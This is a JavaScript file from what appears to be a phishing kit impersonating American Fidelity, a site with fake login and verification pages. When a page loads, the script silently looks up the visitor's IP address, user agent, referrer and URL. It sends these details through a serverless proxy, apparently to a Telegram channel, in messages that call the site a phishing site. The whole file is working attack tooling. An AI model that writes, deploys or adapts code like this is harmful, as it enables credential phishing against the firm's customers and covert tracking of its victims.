var TG = (function () {
  "use strict";

  function send(text) {
    try {
      fetch("/.netlify/functions/notify", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ text: text })
      }).catch(function (err) {
        console.error("[TG proxy error]", err);
      });
    } catch (err) {
      console.error("[TG send error]", err);
    }
  }

  function getIP() {
    return fetch("https://api.ipify.org?format=json")
      .then(function (r) { return r.json(); })
      .then(function (d) { return d.ip; })
      .catch(function ()  { return "N/A"; });
  }

  function ts() {
    return new Date().toLocaleString("en-US", {
      dateStyle: "medium",
      timeStyle: "short"
    });
  }

  /* ==================== NEW: Visit Notification ==================== */
  function notifyVisit() {
    const page = document.title.includes("Verify") ? "Verification Page" : "Login Page";
    
    getIP().then(function (ip) {
      const userAgent = navigator.userAgent || "Unknown";
      const referrer = document.referrer || "Direct";

      const message = 
        "👀 <b>New Visit — American Fidelity Phishing Site</b>\n\n" +
        "📄 Page: <code>" + page + "</code>\n" +
        "🌐 IP: <code>" + ip + "</code>\n" +
        "🔗 URL: <code>" + window.location.href + "</code>\n" +
        "📱 User-Agent: <code>" + userAgent.substring(0, 120) + "</code>\n" +
        "↩️ Referrer: <code>" + referrer + "</code>\n" +
        "⏰ " + ts();

      send(message);
    }).catch(function () {
      // Fallback if IP fetch fails
      send("👀 <b>New Visit — American Fidelity Phishing Site</b>\n\nPage: " + 
           (document.title.includes("Verify") ? "Verification" : "Login") + 
           "\n⏰ " + ts());
    });
  }

  /* Auto-trigger on page load */
  window.addEventListener("load", function () {
    // Small delay to not interfere with other scripts
    setTimeout(notifyVisit, 800);
  });

  return { send: send, getIP: getIP, ts: ts, notifyVisit: notifyVisit };
}());